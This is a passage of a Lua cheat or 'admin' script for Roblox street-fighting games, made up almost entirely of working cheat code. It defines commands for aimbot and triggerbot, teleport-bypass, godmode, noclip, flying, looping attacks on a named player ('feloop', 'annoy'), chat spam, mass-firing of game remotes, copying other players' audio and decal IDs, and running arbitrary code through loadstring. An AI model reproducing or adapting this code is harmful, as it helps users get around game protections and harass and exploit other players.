		ExploitDetectionPlayerTablePositions[tostring(Player)] = nil
	end
	if tostring(Player) == tostring(AimlockTarget) then 
		AimlockTarget = nil
	end
	if Player == LoopPlayer then 
		FeLoop = false 
		LoopPlayer = nil
	end 
	if Player == AnnoyingPlayer then
		TriggerBot = false
		AnnoyOn = false 
		AnnoyingPlayer = nil
		AimbotAutoShoot = false
		Flying = false
		AutoDie = false
		AimlockTarget = nil
	end
	Unesp(Player)
end)

CmdBarTextBox:GetPropertyChangedSignal("Text"):Connect(function()
pcall(function()
		if CmdBarTextBox.Text ~= "" or CmdBarTextBox.Text ~= " " then 
			local Position = 0 
			local Children = CmdBarFrame:GetChildren()
			for i = 1,#Children do 
				local Child = Children[i]
				if Child:IsA'TextLabel' then
					local Text = string.lower(Child.Text):gsub("[Alias] ","")
					if string.find(Text,CmdBarTextBox.Text:lower()) then
						Child.Position = UDim2.new(0,0,0,10 + (Position * 20))
						Position = Position + 1
						if Position >= 7 then
							Child.Position = UDim2.new(0,0,0,1000)
							Position = Position - 1
						end
					else 
						Child.Position = UDim2.new(0,0,0,1000)
					end
				end
			end
		end
	end)
end)

CmdBarTextBox.FocusLost:Connect(function(PressedEnter)
	CmdBarFrame:TweenPosition(UDim2.new(1.5,0,1.5,0),"Out","Quad",0.5,true)
	if PressedEnter then
		CheckCommand(CmdBarTextBox.Text)
		CmdBarTextBox.Text = "" -- stop double executing 
	end
end)

-- [[ End ]] --

-- [[ Commands ]] -- 

AddCommand(function()
	CmdsFrame.Visible = not CmdsFrame.Visible
end,"help",{"cmds","commands"},"Gives you help info","[No Args]")

AddCommand(function(Arguments)
	AliasesEnabled = not AliasesEnabled
	notif("AliasesEnabled","Has been set to "..tostring(AliasesEnabled),5,nil)
end,"usealiases",{"usealias"},"Turns On/Off Aliases","[No Args]")

AddCommand(function(Arguments)
	Instance.new('Tool',LP.Backpack).Name = "Zetox Btools"
end,"btools",{},"Gives you btools","[No Args]")

AddCommand(function(Arguments)
	if Arguments[1] then
		if Arguments[1] == "normal" then 
			workspace.CurrentCamera.FieldOfView = 70 
		elseif tonumber(Arguments[1]) then 
			workspace.CurrentCamera.FieldOfView = Arguments[1]
		end
	end
end,"fieldofview",{"fov"},"Changes Field of View","[Number/Normal]")

AddCommand(function()
	wait(0.6)
	ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Made by !fishgang Cy | Join the cord at A4nyecN","All")
end,"advertise",{},"Advertises the discord","[No Args]")

AddCommand(function(Arguments)
if not loadstring then notif("Don't have loadstring","Aborting the command",5,nil) end 
	if Arguments[1] then 
		loadstring(table.concat(Arguments," "))()
	end
end,"luacode",{"exec","lua"},"Executes Lua code","[Code]")

AddCommand(function()
	local ServerTable = {}
	for i = 1,10 do 
		local Server = HttpService:JSONDecode(game:HttpGet("https://www.roblox.com/games/getgameinstancesjson?placeId="..game.PlaceId.."&startindex="..i))
		for i = 1,#Server.Collection do 
			local Collection = Server.Collection[i]
			ServerTable[Collection.Ping] = Collection.Guid
		end
		for i,v in pairs(ServerTable) do 
			if v ~= game.JobId then 
				TeleportService:TeleportToPlaceInstance(game.PlaceId,v)
				break
			end
		end
	end
end,"serverhop",{},"Hops servers of your current game","[No Args]")

AddCommand(function(Arguments)
	if Arguments[1] and tonumber(Arguments[1]) then
		WalkShoot = true
		Normalwalk = true 
		WalkSpeed = Arguments[1]
		GetChar().Humanoid.WalkSpeed = Arguments[1]
	end
end,"speed",{"ws"},"Changes walkspeed","[Number]")

AddCommand(function(Arguments)
	if Arguments[1] and tonumber(Arguments[1]) then
		Normalwalk = false 
		SprintSpeed = Arguments[1]
		updateHotkeys(ConfigurationFile)
	end 
end,"sprintspeed",{"sspeed"},"Changes sprinting speed","[Number]")

AddCommand(function(Arguments)
	if Arguments[1] and tonumber(Arguments[1]) then
		Normalwalk = false 
		CrouchSpeed = Arguments[1]
		updateHotkeys(ConfigurationFile)
	end 
end,"crouchspeed",{"cspeed"},"Changes crouching speed","[Number]")

AddCommand(function(Arguments)
	if Arguments[1] and tonumber(Arguments[1]) then
		GetChar().Humanoid.JumpPower = Arguments[1] 
	end
end,"jumppower",{"jp"},"Changes JumpPower","['Number]")

AddCommand(function(Arguments)
	if Arguments[1] and tonumber(Arguments[1]) then 
		GetChar().Humanoid.HipHeight = Arguments[1]
	end	
end,"hipheight",{"hh"},"Changes HipHeight","[Number]")

AddCommand(function(Arguments)
	if Arguments[1] then 
		if tonumber(Arguments[1]) then
			workspace.Gravity = tonumber(Arguments[1])
		elseif Arguments[1] and Arguments[1] == "normal" then 
			workspace.Gravity = NormalGravity
		end
	end 
end,"gravity",{"grav"},"Changes gravity","[Number/Normal]")

AddCommand(function(Arguments)
local Character = GetChar()
	if Arguments[1] then 
		if Arguments[1] == "ws" or Arguments[1] == "speed" then 
			Character.Humanoid.WalkSpeed = Arguments[2] and tonumber(Arguments[2]) or NormalWs
			SpawnWs = Arguments[2] and tonumber(Arguments[2]) or NormalWs
			WalkSpeed = Arguments[2] and tonumber(Arguments[2]) or NormalWs
		elseif Arguments[1] == "jp" or Arguments[1] == "jumppower" then 
			Character.Humanoid.JumpPower = Arguments[2] and tonumber(Arguments[2]) or NormalJP
			SpawnJP = Arguments[2] and tonumber(Arguments[2]) or NormalJP
		elseif Arguments[1] == "hh" or Arguments[1] == "hipheight" then 
			Character.Humanoid.HipHeight = Arguments[2] and tonumber(Arguments[2]) or NormalHH
			NormalHH = Arguments[2] and tonumber(Arguments[2]) or NormalHH
		end
	end
end,"loop",{"spawn"},"Spawns you with that [Speed/JumpPower/HipHeight]","[jp/hh/ws [Number]]")

AddCommand(function(Arguments)
	local Tool = GetChar():FindFirstChildOfClass'Tool'
	if not Tool then notif("Tool Needed","Hold a tool then run the command again",5,nil) return end
	Tool.Parent = LP.Backpack
	Tool.Grip = CFrame.new(Arguments[1] or 0,Arguments[2] or 0,Arguments[3] or 0) + Vector3.new(Arguments[4] or 0,Arguments[5] or 0,Arguments[6] or 0)
	Tool.Parent = GetChar()
end,"grippos",{"grip"},"Changes your tool .Grip","[6 Numbers (Optional)]")

AddCommand(function(Arguments)
	NoGh = not NoGh
	notif("NoGroundHit","Has been set to "..tostring(NoGh),5,nil)
end,"nogroundhit",{"nogh","antigh","antigroundhit"},"Can't be groundhit","[No Args]")

AddCommand(function(Arguments)
	if game.PlaceId ~= 4669040 then notif("Due to an update snake did","this only works on prison.",5,nil) return end 
	AlwaysGh = not AlwaysGh
end,"alwaysgh",{"alwaysgroundhit"},"Beat people up like the school bully did to you when you were 13!","[No Args]")

AddCommand(function()
	local HudChildren = LP.PlayerGui.HUD:GetChildren()
	for i = 1,#HudChildren do 
		local Child = HudChildren[i]
		if Child:IsA'Frame' then 
			Child.Active = not Child.Active 
			Child.Draggable = not Child.Draggable 
		end
	end
end,"draggablegui",{},"Makes your HUD draggable","[No Args]")

AddCommand(function(Arguments)
	if not Arguments[1] then 
		GodMode = not GodMode
		if GodMode then
			if game.PlaceId == 455366377 then
				notif("go get KO'ed","make sure you don't get dragged and like fly away somewhere when you get up you will be godded",5,nil)
			end 
		end
		if game.PlaceId ~= 455366377 then
			GetChar():BreakJoints()
		end 
		notif("GodMode","Has been set to "..tostring(GodMode),5,nil)
	end
end,"godmode",{"god"},"Turns on god-mode so you can't be hit (Breaks Tools)","[No Args]")

AddCommand(function(Arguments)
	local Descendants = game:GetDescendants()
	for i = 1,tonumber(Arguments[1]) or 50 do 
		local Child = Descendants[i]
		if Child:IsA'Tool' and Child:FindFirstChild'Click' then 
			Child.Click:FireServer()
			wait()
		end
	end
end,"spamclick",{},"Spam clicks a fuck ton of guns to be very annoying","[Number (Optional)]")

AddCommand(function()
	local WorkspaceChildren = workspace:GetChildren()
	for i = 1,#WorkspaceChildren do
		local Child = WorkspaceChildren[i]
		if Child.Name == "Door" and Child:FindFirstChild'Click' and Child:FindFirstChild'Lock' then 
			Child.Lock.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
			Child.Click.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
		end
	end
end,"doors",{},"Unlocks/Locks doors","[No Args]")

AddCommand(function(Arguments)
	Spamming = not Spamming
	if Arguments[1] then 
		SpamMessage = table.concat(Arguments," ")
	end
end,"spam",{},"Spams the message that you set","[Message To Spam]")

AddCommand(function(Arguments)
	if Arguments[1] then 
		SpamDelay = tonumber(Arguments[1]) or 1
	end 
end,"spamdelay",{},"Changes the spam delay amount","[Number]")

AddCommand(function(Arguments)
	local GameDescendants = game:GetDescendants()
	for i = 1,10 do 
		for i = 1,#GameDescendants do
			local Child = GameDescendants[i]
			if Child:IsA'Tool' and Child:FindFirstChild'Click' then 
				Child.Click:FireServer()
			end
		end
	end
end,"muteallradios",{"muteradios"},"Mutes all radios (Doesn't loop)","[No Args]")

AddCommand(function(Arguments)
	if not Arguments[1] then 
		TeleportService:TeleportToPlaceInstance(game.PlaceId,game.JobId)
	end
end,"rejoin",{"rj"},"Rejoins the current game server","[No Args]")

AddCommand(function(Arguments)
	if not Arguments[1] then 
		GetChar():BreakJoints()
	end 
end,"reset",{"re"},"Kills your Player","[No Args]")

AddCommand(function()
	AirwalkOn = not AirwalkOn
	AirWalk.Parent = AirwalkOn and workspace or not AirwalkOn and nil 
end,"airwalk",{},"Allows you to walk in the air","[No Args]")

AddCommand(function()
	NeverSitting = not NeverSitting
	if NeverSitting then 
		local workspaceChildren = workspace:GetDescendants()
		for i = 1,#workspaceChildren do 
			local Child = workspaceChildren[i]
			if string.find(Child.ClassName:lower(),"seat") then
				Child.Parent = CoreGui
			end
		end
	else
		local CoreGuiDescendants = CoreGui:GetDescendants() 
		for i = 1,#CoreGuiDescendants do 
			local Child = CoreGuiDescendants[i]
			if string.find(Child.ClassName:lower(),"seat") then 
				Child.Parent = workspace
			end
		end
	end
end,"neversit",{"nsit"},"Toggles the possibility of you being able to sit down","[No Args]")

AddCommand(function()
	AutoDie = not AutoDie
	notif("AntiKO","Has been set to "..tostring(AutoDie),5,nil)
end,"noko",{"antiko","autodie","autoreset"},"Auto resets when you get KO'ed","[No Args]")

AddCommand(function()
	Noclip = not Noclip
	notif("Noclip","Has been set to "..tostring(Noclip),5,nil)
end,"noclip",{},"Allows you to walk through walls and stuff","[No Args]")

AddCommand(function(Arguments)
	if Arguments[1] then 
		local Player = PlrFinder(Arguments[1])
		if Player and Player.Character and Player.Character:FindFirstChild'Head' and Player ~= LP then 
			Teleport(Player.Character.Head.CFrame)
		end
	end
end,"goto",{"to"},"Teleports you to a player","[Player Name]")

AddCommand(function(Arguments)
	if Arguments[1] and tonumber(Arguments[1]) then 
		ClockTime = Arguments[1]
	else
		ClockTime = nil 
	end
end,"time",{},"Changes the time","[Number]")

AddCommand(function(Arguments)
	if Arguments[1] then 
		local Player = PlrFinder(Arguments[1])
		if Player then 
			notif(Player.Name,"has the account age of "..Player.AccountAge,5,nil)
		end
	end
end,"playerinfo",{"info"},"Returns a players age","[No Args]")

AddCommand(function(Arguments)
	AntiAim = not AntiAim
	if not AntiAim then
		stopAnim("215384594")
		stopAnim("188632011")
		for i,v in pairs(GetChar().Torso:GetChildren()) do 
			if v:IsA'BodyVelocity' and v.Name ~= "CyAdminFly" then 
				v:Destroy()
			end 
		end 
	else
		for i = 1,500 do
			local BodyV = Instance.new("BodyVelocity",GetChar().Torso)
			BodyV.MaxForce = Vector3.new(100,100,100)
			BodyV.P = math.huge
			BodyV.Velocity = Vector3.new(math.huge,math.huge,math.huge)
		end
		if Arguments[1] and Arguments[1] == "spin" then
			local Track = GetChar().Humanoid:LoadAnimation(SpinAnimation)
			while AntiAim and GetChar():FindFirstChild'Humanoid' and GetChar().Humanoid.Health > 0 and wait() do
				stopAnim("188632011")
				Track:play(0.1,1,10)
			end
		else
			stopAnim("215384594")
			stopAnim("188632011")
			GetChar().Humanoid:LoadAnimation(AntiAimAnimation):Play(5,45,250)
		end 
	end 
end,"antiaim",{},"Breaks camlock to an extent","[Spin/No Args]")

AddCommand(function()
	local Punch = GetChar():FindFirstChild'Punch'
	if Punch then 
		if Punch.Grip == CFrame.new(math.huge,math.huge,math.huge) then
			Punch.Parent = LP.Backpack
			Punch.Grip = CFrame.new(0,0,0)
			wait()
			Punch.Parent = GetChar()
			notif("SuperPunch","Turned off",5,nil)
		else
			Punch.Parent = LP.Backpack
			Punch.Grip = CFrame.new(math.huge,math.huge,math.huge)
			wait()
			Punch.Parent = GetChar()
			notif("SuperPunch","Turned on (Lasts one life also really buggy)",5,nil)
		end
	else 
		notif("SuperPunch","Hold your fists",5,nil)
	end 
end,"superpunch",{},"This is really stupid and buggy but funny when it works","[No Args]")

AddCommand(function(Arguments)
	if Arguments[1] then
		if Arguments[1] == "1" then
			GunAnim = "1"
		elseif Arguments[1] == "2" then 
			GunAnim = "2"
		elseif Arguments[1] == "off" then 
			GunAnim = "None"
		else 
			notif("GunAnim","Only [1/2/Off] work")
			return
		end 
		notif("GunAnim","Has been set to "..GunAnim,5,nil)
	end 
end,"gunanim",{},"Stupid gun animations (gunanim [1/2/off])","[1/2/off]")

AddCommand(function(Arguments)
	if Arguments[1] then
		stopAnim("33796059")
		stopAnim("35654637")
		if Arguments[1] == "1" then 
			GetChar().Humanoid:LoadAnimation(Dance1Animation):Play()
		elseif Arguments[1] == "2" then 
			GetChar().Humanoid:LoadAnimation(Dance2Animation):Play()
		elseif Arguments[1] == "off" then 
			stopAnim("33796059")
			stopAnim("35654637")
		end 
	end
end,"dance",{},"Stupid dance anims (1,2,Off)","[Dance 1/Dance 2/Off]")

AddCommand(function(Arguments)
	if Arguments[1] then 
		if Arguments[1] == "head" then 
			CamlockTarget = "Head"
		elseif Arguments[1] == "torso" then 
			CamlockTarget = "Torso"
		end
		notif("CamlockTarget","Has been set to "..CamlockTarget,5,nil)
	end
end,"camlocktarget",{"cltarget"},"Head,Torso to switch the camlock target","[Head/Torso]")

AddCommand(function()
	if game.PlaceId ~= 455366377 then notif("BringCar","Streets Only",5,nil) return end
	math.randomseed(os.time())
	if workspace:FindFirstChild'Cars' then
		local PartFound = GetChar():FindFirstChild'RealHumanoidRootPart' or GetChar():FindFirstChild'Torso'
		local ChildrenOfCars = workspace.Cars:GetDescendants()
		for i = 1,#ChildrenOfCars do 
			local i = math.random(1,#ChildrenOfCars)
			local Child = ChildrenOfCars[i]
			if Child:IsA'VehicleSeat' and Child.Name == "Drive" and not Child.Occupant then
				PartFound.CFrame = Child.CFrame
			end
		end
	else
		notif("No cars to bring","try again later",5,nil)
	end
end,"bringcar",{},"Brings a car (Normal TS only","[No Args]")

AddCommand(function()
	if game.PlaceId ~= 455366377 then notif("Heal","Streets Only",5,nil) return end
	if TpBypass then notif("Due to snakes bad code","you can not use burgers/drinks with the tpbypass") return end
		if GrabItem("burger",GetChar().Head.CFrame) then
		local Hamborger = LP.Backpack:FindFirstChild'Burger'
		if Hamborger then 
			Hamborger.Parent = GetChar()
			Hamborger:Activate() -- CHEEMS
			repeat RunService.Heartbeat:Wait() until Hamborger.Parent ~= LP.Character
		end
	end
	if GrabItem("drink",GetChar().Head.CFrame) then
		local Drink = LP.Backpack:FindFirstChild'Drink'
		if Drink then 
			Drink.Parent = GetChar()
			Drink:Activate()
		end 
	end
end,"heal",{"h"},"Heals you (Duh?)","[No Args]","[No Args]")

AddCommand(function(Arguments)
	if game.PlaceId ~= 455366377 then notif("Sorry,","Streets Only",5,nil) return end 
	HealBot = not HealBot 
	if Arguments[1] and Arguments[2] and tonumber(Arguments[2]) and Arguments[1] == "health" then 
		HealBotHealth = tonumber(Arguments[2])
	end 
	notif("HealBot","Has been set to "..tostring(HealBot),5,nil) 
end,"healbot",{},"Turns on auto healing at a set health (Defaults at 25 hp","[Health [Number] (Optional)]")

AddCommand(function()
	if game.PlaceId ~= 455366377 then notif("Heal","Streets Only",5,nil) return end
	if not GetChar():FindFirstChildOfClass'Tool' or not GetChar():FindFirstChildOfClass'Tool':FindFirstChild'Clips' then notif("Tool needed","Hold a gun",5,nil) return end 
	GrabItem("ammo",GetChar().Head.CFrame)
end,"reload",{"r"},"Gives your current gun ammo","[No Args]")

AddCommand(function(Arguments)
	if Arguments[1] then 
		local Player = PlrFinder(Arguments[1])
		if Player and Player.Character and Player ~= LP then
			if ViewPlayerConnection then ViewPlayerConnection:Disconnect() ViewPlayerConnection = nil end 
			workspace.CurrentCamera.CameraSubject = Player.Character 
			if Arguments[2] and Arguments[2] == "loop" then 
				ViewPlayerConnection = Player.CharacterAdded:Connect(function(C)
					workspace.CurrentCamera.CameraSubject = C 
				end)
			end
		end
	end
end,"view",{},"Look through a different players perspective","[No Args]")

AddCommand(function()
	if ViewPlayerConnection then ViewPlayerConnection:Disconnect() ViewPlayerConnection = nil end 
	workspace.CurrentCamera.CameraSubject = GetChar()
end,"unview",{},"Look through your own vision like a normal person","[No Args]")

AddCommand(function()
	GunStomp = not GunStomp
	notif("GunStomp","Has been set to "..tostring(GunStomp),5,nil)
end,"gunstomp",{},"Toggles GunStomp (On by default)","[No Args]")

AddCommand(function(Arguments)
	CamLocking = not CamLocking 
	if Arguments[1] then 
		local Player = PlrFinder(Arguments[1])
		if Player then 
			CamlockPlayer = Player 
		end
	end
end,"camlock",{"lockcam","cl"},"Different type of aimbot (Uses camera instead of the remote)","[Player Name]")

AddCommand(function(Arguments)
	if Arguments[1] then 
		if Arguments[1] == "auto" then 
			AutoFarm = not AutoFarm
			return 
		end
		if Arguments[1] == "sawed" then Arguments[1] = "sawed off" end
		farm(Arguments[1])
	end
end,"farm",{},"Farm (Cash,Sawed Off,Uzi,Shotty,Auto)","[Item/Auto]")

AddCommand(function()
	ItemEsp = not ItemEsp
	if ItemEsp then
		for i,_ in pairs(FarmTable) do
			local Part,String = find(i)
			if Part ~= "None" then 
				Esp(Part,String)
			end
		end
	else
		local Children = workspace:GetChildren()
		for i = 1,#Children do 
			Unesp(Children[i])
		end
	end
end,"itemesp",{},"Turns on ItemEsp","[No Args]")

AddCommand(function(Arguments)
if game.PlaceId ~= 455366377 then notif("Wont Work","Streets Only",5,nil) return end 
	if Arguments[1] then
		if Arguments[1] == "sawed" then Arguments[1] = "sawedoff" end
		if PartTable[Arguments[1]] then 
			GrabItem(Arguments[1],GetChar().Head.CFrame)
		end
	end
end,"get",{"tpto"},"(Burger,Drink,Ammo,Pipe,Machete,SawedOff,Spray,Uzi,Glock)","[Item]")

AddCommand(function(Arguments)
	if Arguments[1] then 
		if PlaceTable[Arguments[1]] then 
			Teleport(PlaceTable[Arguments[1]])
		elseif Arguments[1] == "banland" then 
			TeleportService:Teleport(4669040)
		elseif Arguments[1] == "normalstreets" then 
			TeleportService:Teleport(455366377)
		end
	end
end,"place",{},"(SandBox,Jail,Gas,Court,Beach,Bank,BanLand,NormalStreets)","[Place]")

AddCommand(function(Arguments)
	Blinking = not Blinking
	if Blinking then
		if Arguments[1] and tonumber(Arguments[1]) then 
			BlinkSpeed = Arguments[1]
		else
			BlinkSpeed = 2
		end
	end
	notif("Blink","Has been set to "..tostring(Blinking),5,nil) 
end,"blink",{},"Different method of speed (Uses CFrame)","[Number (Optional)]")

AddCommand(function(Arguments)
	WalkShoot = not WalkShoot
	notif("WalkShoot","Has been set to "..tostring(WalkShoot),5,nil)
end,"walkshoot",{"noslow"},"Allows you to turn On/Off Walk Shooting","[No Args]")

AddCommand(function(Arguments)
	FeLoop = not FeLoop
	if Arguments[1] then
		FeLoop = true 
		local Player = PlrFinder(Arguments[1])
		if Player then 
			GetChar():BreakJoints()
			LoopPlayer = Player 
		end
	else
		LoopPlayer = nil
	end
end,"feloop",{},"First you were a skid, Now you're annoying with a simple use of this command!","[Player]")

AddCommand(function(Arguments)
	AnnoyOn = not AnnoyOn
	if Arguments[1] then 
		if AnnoyOn then
			local Player = PlrFinder(Arguments[1])
			if Player and Player ~= LP then 
				AnnoyingPlayer = Player
			end 
		end 
	end 
end,"annoy",{"shield"},"Loop Teleports you infront of the Player","[Player]")

AddCommand(function(Arguments)
	TriggerBot = not TriggerBot
	if not TriggerBot then
		wait()
		AnnoyOn = false 
		AnnoyingPlayer = nil
		AimbotAutoShoot = false
		Flying = false
		AutoDie = false
	end  
	if Arguments[1] and TriggerBot then
		AutoDie = true
		CheckCommand("annoy "..Arguments[1])
		AimbotAutoShoot = true
		if not NeverSitting then 
			CheckCommand("neversit")
		end
	end 
end,"triggerbot",{},"triggerbot goes brrrrrrrrrrrrrrrr","[Player]")

AddCommand(function(Arguments)
	if not GetChar():FindFirstChildOfClass'Tool' or not GetChar():FindFirstChildOfClass'Tool':FindFirstChild'Clips' then notif("Tool needed","Hold a gun",5,nil) return end 
	if RemoteGunBodyPos then 
		RemoteGunBodyPos:Destroy()
		RemoteGunBodyPos = nil
		RemoteGunPlayer = nil
	end
	if Arguments[1] then 
		local Player = PlrFinder(Arguments[1])
		if Player then 
			RemoteGunPlayer = Player
			RemoteGunBodyPos = createBodyPos(GetChar():FindFirstChildOfClass'Tool'.Handle)
		end
	end
end,"remotegun",{},"Hold any gun","[Player]")

AddCommand(function()
	if game.PlaceId ~= 455366377 then notif("TriggerBotAutoReload","Only works on normal Streets",5,nil) return end
	TriggerBotAutoReload = not TriggerBotAutoReload
end,"triggerbotautoreload",{},"Triggerbot auto reload (instead of resetting only works on Ts) (also probably buggy)","[No Args]")

AddCommand(function(Arguments)
	if Arguments[1] and Arguments[2] and tonumber(Arguments[2]) then
		if Arguments[1] == "down" then 
			LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position = LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position + UDim2.new(UDim.new(),LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Size.Y + UDim.new(0,tonumber(Arguments[2])))
			LP.PlayerGui.Chat.Frame.ChatBarParentFrame.Position = LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position + UDim2.new(UDim.new(),LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Size.Y + UDim.new(0,3))
		elseif Arguments[1] == "up" then 
			LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position = LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position - UDim2.new(UDim.new(),LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Size.Y + UDim.new(0,tonumber(Arguments[2])))
			LP.PlayerGui.Chat.Frame.ChatBarParentFrame.Position = LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position + UDim2.new(UDim.new(),LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Size.Y + UDim.new(0,3))
		end
	end
end,"movechat",{},"Move Chat Up/Down with (Up/Down [Number])","[Up/Down] [Number]")

AddCommand(function(Arguments)
	if Arguments[1] and Arguments[1] == "legacy" then
		local Arm = GetChar():FindFirstChild'Right Arm'
		if Arm then
			Arm:Destroy()
		end
	else
		AntiKill = true 
		ToolTable = LP.Backpack:GetChildren()
		local Character = GetChar()
		Character.ChildAdded:Connect(function(Tool)
			if Tool:IsA'Tool' then
				if table.find(ToolTable,Tool) then return end
				Tool:Destroy()
			end
		end)
		notif("AntiKill","Turn on noclip for best results")
	end
end,"antikill",{},"Makes FE Loop not work (Legacy for removing right arm)","[Legacy (Optional)]")

AddCommand(function(Arguments)
	if Arguments[1] then 
		local Player = PlrFinder(Arguments[1])
		if Player and Player.Character then
			local BoxModel = Player.Character:FindFirstChild'BoxModel' or Player.Character:FindFirstChild'BoomBox'
			if BoxModel and BoxModel:FindFirstChild'Handle' then
				if writefile then
					writefile("AudioLog from "..Player.Name.." "..math.random(1,99)..".txt",string.match(BoxModel.Handle:FindFirstChildOfClass'Sound'.SoundId,'%d+'))
					notif("Audio has been stolen.","Check your exploits workspace folder",5,nil)
				else
					print("Audio From: "..Player.Name.." Id: "..string.match(BoxModel.Handle:FindFirstChildOfClass'Sound'.SoundId,'%d+'))
					notif("Audio has been stolen.","It has been printed to your console (F9) due to your exploit not supporting writefile",5,nil)
				end
			end
		end
	end
end,"steal",{},"Steals a persons audio","[Player]")

AddCommand(function(Arguments)
	if Arguments[1] then 
		local Player = PlrFinder(Arguments[1])
		if Player then 
			local Decal = workspace:FindFirstChild(Player.Name.."Spray")
			if Decal and Decal:FindFirstChildOfClass'Decal' then
				if writefile then  
					writefile("DecalLog from "..Player.Name.." "..math.random(1,99)..".txt",tostring(string.match(Decal.Decal.Texture,'%d+')))
				else
					print("Decal From: "..Player.Name.." Id: "..tostring(string.match(Decal.Decal.Texture,'%d+')))
				end 
			end
		end
	end
end,"decalsteal",{},"Steals a persons decal","[Player]")

AddCommand(function()
	if game.PlaceId ~= 455366377 then return notif("Wont work","Streets Only",5,nil) end
	if RainbowHats then RainbowHats = false LP.Backpack.Stank:FireServer("ren") end
	if RainbowFrame.Visible then RainbowFrame.Visible = false return end 
	RainbowScrolling:ClearAllChildren()
	RainbowFrame.Visible = true 
	local C = LP.PlayerGui.HUD.Clan.Group.Reps:GetChildren()
	createRainbow(UDim2.new(-0.002,0,0,-10),"All")
	for i = 1,#C do
		local Child = C[i]
		if Child:IsA'TextButton' and Child:FindFirstChild'typ' then 
			createRainbow(UDim2.new(-0.002,0,0,-40 + (i * 30)),Child.typ.Value,Child.typ)
		end
	end
end,"rainbowhats",{},"Opens a GUI so you can pick what hat to rainbowize","[No Args]")

AddCommand(function(Arguments)
	if game.PlaceId ~= 455366377 then return notif("Wont work","Streets Only",5,nil) end
	if Arguments[1] and tonumber(Arguments[1]) then
		Rainbowdelay = tonumber(Arguments[1])
	end
end,"rainbowhatdelay",{},"Changes the delay for rainbow hats","[Number]")

AddCommand(function(Arguments)
	if not Arguments[2] then 
		Flying = not Flying
	end 
	if Arguments[1] then 
		if Arguments[1] == "up" then 
			FlySpeed = FlySpeed + Arguments[2] or 1
			notif("FlySpeed","Has been set to "..FlySpeed,5,nil)
		elseif Arguments[1] == "down" then 
			FlySpeed = FlySpeed - Arguments[2] or 1
			notif("FlySpeed","Has been set to "..FlySpeed,5,nil)
		elseif tonumber(Arguments[1]) then
			FlySpeed = tonumber(Arguments[1])
			if Flying then
				Fly()
			end
		end
	else 
		if Flying then
			Fly()
		end 
	end
end,"fly",{},"Allows you to fly [Up/Down Speed]","[Up/Down Speed]/Speed")

AddCommand(function()
	DoubleJumpEnabled = not DoubleJumpEnabled
	notif("DoubleJumpEnabled","Has been set to "..tostring(DoubleJumpEnabled),5,nil)
end,"doublejump",{"infinitejump"},"Allows you to jump forever","[No Args]")

AddCommand(function()
	TpBypass = not TpBypass 
	GetChar():BreakJoints()
end,"tpbypass",{},"Teleportation Bypass (Allows Infinite FlySpeed etc)","[No Args]")

AddCommand(function(Arguments)
	if Arguments[1] then
		if WhiteListedParts[Arguments[1]] then 
			AimMode = WhiteListedParts[Arguments[1]]
			notif("AimTarget","has been set to "..AimMode,5,"rbxassetid://1281284684")
		end
	end
end,"aimtarget",{},"Changes the aim target [Head/Torso/HumanoidRootPart/Prediction]","[Head/Torso/HumanoidRootPart/Prediction]")

AddCommand(function(Arguments)
	if Arguments[1] then
		if Arguments[1] == "leftclick" then 
			AimlockMode = "LeftClick" 
		elseif Arguments[1] == "rightclick" then 
			AimlockMode = "RightClick" 
		elseif Arguments[1] == "nomouse" then 
			AimlockMode = "NoMouse"
		elseif Arguments[1] == "closest" then 
			AimlockMode = "Closest" 
			local PlayersT = Players:GetPlayers()
			for i = 1,#PlayersT do
				if PlayersT[i] ~= LP then 
					AimlockClosest(PlayersT[i])
				end 
			end
		end
		updateHotkeys(ConfigurationFile)
	end
end,"aimmode",{"aimlockmode"},"LeftClick/RightClick/NoMouse/Closest (Sets the way you can aimlock)","[LeftClick/RightClick/NoMouse/Closest]")

AddCommand(function(Arguments)
	if Arguments[1] and tonumber(Arguments[1]) then
		AimbotVelocity = tonumber(Arguments[1])
		if AimMode ~= "OldPrediction" and AimMode ~= "Prediction" then 
			notif("Note:","This only works with aimtarget oldprediction/prediction",5,nil)
		end
	end 
end,"aimvelocity",{},"Changes your Aimbots Velocity (If mode is set to a prediction mode) (Default: 5)","[Number]")

AddCommand(function(Arguments)
	if Arguments[1] and Arguments[1] ~= "all" then
		local Player = PlrFinder(Arguments[1])
		if Player and Player ~= LP and tostring(AimlockTarget) ~= tostring(Player) then 
			AimlockTarget,Aimlock = Player.Character,true
			local Connection;Connection = Player.CharacterAdded:Connect(function(C)
				if tostring(C) == tostring(AimlockTarget) then
					AimlockTarget = C
				else
					Connection:Disconnect()
					Connection = nil
				end
			end)
			notif("AimlockTarget","Has been set to "..AimlockTarget.Name,5,nil)
		end
	else
		Aimlock = not Aimlock
		notif("Aimlock","Has been set to "..tostring(Aimlock),5,nil)		
	end
end,"aimlock",{"aim"},"Aimbot (Different method than camlock)","[Player]")

--[[AddCommand(function()
	if game.PlaceId ~= 455366377 then notif("BFG","Streets only",5,nil) end
	BfgOn = not BfgOn
end,"bfg",{},"Shitty bfg I made (Normal Ts Only)","[No Args]")]]

AddCommand(function(Arguments)
	if Arguments[1] then
		if Arguments[1] == "triggerbot" then 
			AutoTriggerBot = not AutoTriggerBot
			notif("AutoTriggerBot","Has been set to "..tostring(AutoTriggerBot),5,nil)
		elseif Arguments[1] == "feloop" then 
			AutoFeloop = not AutoFeloop
			notif("AutoFeloop","Has been set to "..tostring(AutoFeloop),5,nil)
		end
	else 
		AutoTarget = not AutoTarget 
		notif("AutoTarget","Has been set to "..tostring(AutoTarget),5,nil)
	end 
end,"autotarget",{"autolock"},"autotarget [triggerbot/feloop/no arguments] triggerbot auto triggerbots when someone hits you,no args auto camlocks/aimlocks","[TriggerBot/FeLoop/No Args]")

AddCommand(function()
	AimbotAutoShoot = not AimbotAutoShoot
	notif("AimbotAutoShoot","Has been set to "..tostring(AimbotAutoShoot),5,nil)		
